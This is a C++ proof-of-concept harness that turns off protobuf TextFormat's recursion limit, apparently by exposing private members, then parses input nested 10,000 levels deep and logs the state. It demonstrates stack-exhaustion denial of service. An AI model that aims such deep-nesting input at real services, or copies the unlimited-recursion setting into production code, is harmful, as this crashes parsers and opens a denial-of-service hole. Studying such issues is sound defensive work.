#include <cstdio>
#include <cstdlib>
#include <limits>
#include <string>

#define private public
#include <google/protobuf/text_format.h>
#undef private

#include "../poc_backup_20260415_083916/node.pb.h"

#define CHECKPOINT(name) std::fprintf(stderr, "=== %s ===\n", name)
#define STATE_INT(var) std::fprintf(stderr, "[STATE] %s = %d\n", #var, (int)(var))

namespace {

int ParsedDepth(const poc::Node& node) {
  int depth = 0;
  const poc::Node* current = &node;
  while (current->has_child()) {
    ++depth;
    current = &current->child();
  }
  return depth;
}

std::string BuildInput(int depth) {
  std::string input;
  input.reserve(static_cast<size_t>(depth) * 8 + 32);
  for (int i = 0; i < depth; ++i) {
    input += "child { ";
  }
  input += "value: \"x\" ";
  for (int i = 0; i < depth; ++i) {
    input += "} ";
  }
  return input;
}

}  // namespace

int main(int argc, char** argv) {
  int target_depth = 10000;
  if (argc > 1) {
    target_depth = std::atoi(argv[1]);
  }

  CHECKPOINT("setup");
  STATE_INT(target_depth);

  google::protobuf::TextFormat::Parser parser;
  parser.SetRecursionLimit(std::numeric_limits<int>::max());
  STATE_INT(parser.recursion_limit_);

  const std::string input = BuildInput(target_depth);
  STATE_INT(input.size());

  poc::Node node;

  CHECKPOINT("before-parse");
  const bool ok = parser.ParseFromString(input, &node);
  CHECKPOINT("after-parse");
  STATE_INT(ok);

  const int parsed_depth = ParsedDepth(node);
  STATE_INT(parsed_depth);

  if (node.has_value()) {
    std::fprintf(stderr, "[STATE] value_present = 1\n");
  } else {
    std::fprintf(stderr, "[STATE] value_present = 0\n");
  }

  return ok ? 0 : 1;
}
